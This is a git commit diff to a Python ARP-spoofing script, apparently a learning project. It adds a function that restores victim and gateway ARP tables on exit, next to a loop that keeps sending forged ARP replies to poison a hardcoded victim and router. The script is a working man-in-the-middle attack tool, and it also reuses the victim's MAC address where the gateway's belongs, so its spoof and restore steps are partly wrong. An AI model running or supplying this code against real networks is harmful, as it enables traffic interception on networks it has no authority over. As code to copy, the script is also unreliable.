4fc31cfc5f8b579059ba62e293237e7d297b12c3
Hem Parekh <54116609+Hem1700@users.noreply.github.com>
2021-02-22 19:29:24 +0530

    Restoring ARP table after the program quits

--- arp_spoof.py
+++ arp_spoof.py
@@ -21,16 +21,30 @@ def spoof(target_ip , spoof_ip , target_mac):
     # print(packet.summary()) To print the content of the packet
     # Send the packet to the target machine giving it the kali's MAC Addresss as the address of thr router
 
-target_mac = get_mac("192.168.0.103")  
-sent_packets_count = 0 
+# This function restores the arp table of the victim machine and the router setting it back to its original value
+def restore(destination_ip , source_ip , destination_mac , source_mac):
+    packet = scapy.ARP(op = 2 , pdst = destination_ip , hwdst =destination_mac, psrc =source_ip , hwsrc=source_mac)
+    # print(packet.show())
+    # print(packet.summary())
+    scapy.send(packet , count= 4 , verbose = False)
+
+
+target_ip = "192.168.0.103"
+gateway_ip = "192.168.0.1"
+target_mac = get_mac(target_ip)  #Also destination_mac  
+source_mac = get_mac(gateway_ip)
+
 try:
+    sent_packets_count = 0 
     while True:
-        spoof("192.168.0.103", "192.168.0.1" , target_mac)
-        spoof("192.168.0.1", "192.168.0.103" , target_mac)
+        spoof(target_ip, gateway_ip , target_mac)
+        spoof(gateway_ip, target_ip , target_mac)
         sent_packets_count = sent_packets_count+2
-        print("\r[+] Packets sent : " + str(sent_packets_count)), #Storing the print statement in buffer and then flushing the buffer to print in one line
-        #print("\r [+] Packets sent :" + str(sent_packets_count), end=" ") # This is the syntax to print buffer in python3 , you wont be needing sys.stdout.flush() , this statement does all the work
-        sys.stdout.flush()
+     #   print("\r[+] Packets sent : " + str(sent_packets_count)), #Storing the print statement in buffer and then flushing the buffer to print in one line
+        print("\r [+] Packets sent :" + str(sent_packets_count), end=" ") # This is the syntax to print buffer in python3 , you wont be needing sys.stdout.flush() , this statement does all the work
+       # sys.stdout.flush()
         time.sleep(2)
 except KeyboardInterrupt:
-    print("[+] Detected CTRL+C ...... Quitting")        
+    print("[+] Detected CTRL+C ...... Resetting ARP tables...... Please wait") 
+    restore(target_ip, gateway_ip , target_mac , source_mac)
+    restore(gateway_ip , target_ip , target_mac , source_mac)       
